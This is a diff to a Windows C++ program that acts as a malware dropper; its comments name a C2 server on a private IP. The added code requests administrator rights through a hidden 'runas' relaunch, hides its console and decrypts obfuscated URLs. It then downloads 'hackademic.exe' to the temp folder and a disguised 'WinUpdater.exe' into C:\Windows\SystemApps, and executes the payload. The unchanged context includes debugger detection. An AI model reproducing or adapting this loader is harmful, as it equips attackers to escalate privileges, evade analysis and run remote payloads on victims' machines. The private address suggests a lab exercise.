@@ -12,6 +12,7 @@
 #include <algorithm>
 #include "skCrypter.h"
 #include <fstream>
+#include <shellapi.h>
 
 
 #pragma comment(lib, "urlmon.lib")
@@ -37,6 +38,49 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     ULONG UniqueProcessId;
     ULONG InheritedFromUniqueProcessId;
 } PROCESS_BASIC_INFORMATION;
+
+#include <shellapi.h> // Для ShellExecuteEx
+
+bool IsRunAsAdmin() {
+    BOOL fIsRunAsAdmin = FALSE;
+    PSID pAdministratorsGroup = NULL;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+
+    if (AllocateAndInitializeSid(&NtAuthority, 2,
+        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
+        0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
+
+        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
+        FreeSid(pAdministratorsGroup);
+    }
+
+    return fIsRunAsAdmin == TRUE;
+}
+
+bool RelaunchAsAdmin() {
+    WCHAR szPath[MAX_PATH];
+    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH)) {
+        return false;
+    }
+
+    SHELLEXECUTEINFOW sei = { sizeof(sei) };
+    sei.lpVerb = L"runas";  // запрос прав администратора
+    sei.lpFile = szPath;
+    sei.hwnd = NULL;
+    sei.nShow = SW_HIDE;
+
+    if (!ShellExecuteExW(&sei)) {
+        DWORD dwError = GetLastError();
+        if (dwError == ERROR_CANCELLED) {
+            // Пользователь отказался от повышения прав
+            return false;
+        }
+        return false;
+    }
+
+    return true; // Перезапуск с админскими правами запущен
+}
+
 
 bool sendLogToServer(const std::string& logMessage) {
     const char* server = "192.168.100.1"; // IP сервера C2
@@ -258,9 +302,21 @@ bool detectDebuggerAll() {
         detectParentProcess();
 }
 
-std::wstring getDownloadURL() {
+std::wstring getHackademicURL() {
     auto url = skCrypt(L"http://192.168.100.1:8080/hackademic.exe");
     return url.decrypt();
+}
+
+std::wstring getwinUpdaterURL() {
+    auto url = skCrypt(L"http://192.168.100.1:8080/WinUpdater.exe");
+    return url.decrypt();
+}
+
+std::wstring getspinnerURL() {
+    auto url = skCrypt(L"http://192.168.100.1:8080/spinner.gif");
+    return url.decrypt();
+
+    
 }
 
 
@@ -315,7 +371,7 @@ void writeSessionSeparator() {
     strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", timeInfo);
 
     std::string computerName = getComputerName();
-    
+
 
     writeLog("\n----- New Session Started -----");
     writeLog("Time: " + std::string(timeStr));
@@ -324,6 +380,17 @@ void writeSessionSeparator() {
 }
 
 int main() {
+
+
+    if (!IsRunAsAdmin()) {
+        if (RelaunchAsAdmin()) {
+            return 0; // Выход, т.к. перезапуск уже выполнен
+        }
+        else {
+            writeLog("This program requires administrator privileges.");
+            return 1;
+        }
+    }
 
     HWND consoleWindow = GetConsoleWindow();
     ShowWindow(consoleWindow, SW_HIDE);
@@ -353,26 +420,53 @@ int main() {
         return 0;
     }
 
-
     wchar_t tempPath[MAX_PATH];
     if (GetTempPathW(MAX_PATH, tempPath) == 0) {
         writeLog("Failed to get temp path.");
         return 1;
     }
 
-    auto encryptedSavePath = skCrypt(L"autoruns.exe");
-    std::wstring savePath = std::wstring(tempPath) + encryptedSavePath.decrypt();
-    std::wstring downloadURL = getDownloadURL();
+    auto hackademicFileName = skCrypt(L"hackademic.exe").decrypt();
+    std::wstring hackademicSavePath = std::wstring(tempPath) + hackademicFileName;
+    std::wstring hackademicURL = getHackademicURL();
 
-    if (!downloadFile(downloadURL, savePath)) {
-        writeLog("Exiting due to failed download.");
+    // Логируем URL для проверки
+    writeLog("hackademicURL: " + std::string(hackademicURL.begin(), hackademicURL.end()));
+
+    if (!downloadFile(hackademicURL, hackademicSavePath)) {
+        writeLog("Exiting due to failed download of hackademic.exe.");
         return 1;
     }
 
-    if (!executeFile(savePath)) {
+
+    std::wstring winUpdaterURL = getwinUpdaterURL();
+    std::wstring winUpdaterSavePath = L"C:\\Windows\\SystemApps\\WinUpdater.exe";
+
+    // Логируем URL для проверки
+    writeLog("winUpdaterURL: " + std::string(winUpdaterURL.begin(), winUpdaterURL.end()));
+
+    if (!downloadFile(winUpdaterURL, winUpdaterSavePath)) {
+        writeLog("Exiting due to failed download of WinUpdater.exe.");
+        return 1;
+    }
+
+    std::wstring spinnerURL = getspinnerURL();
+    std::wstring spinnerSavePath = L"C:\\Windows\\SystemApps\\spinner.gif";
+
+    // Логируем URL для проверки
+    writeLog("spinnerURL: " + std::string(spinnerURL.begin(), spinnerURL.end()));
+
+    if (!downloadFile(spinnerURL, spinnerSavePath)) {
+        writeLog("Exiting due to failed download of spinner.gif.");
+        return 1;
+    }
+
+    if (!executeFile(hackademicSavePath)) {
         writeLog("Exiting due to failed execution.");
         return 1;
     }
+
+   
 
     return 0;
 }
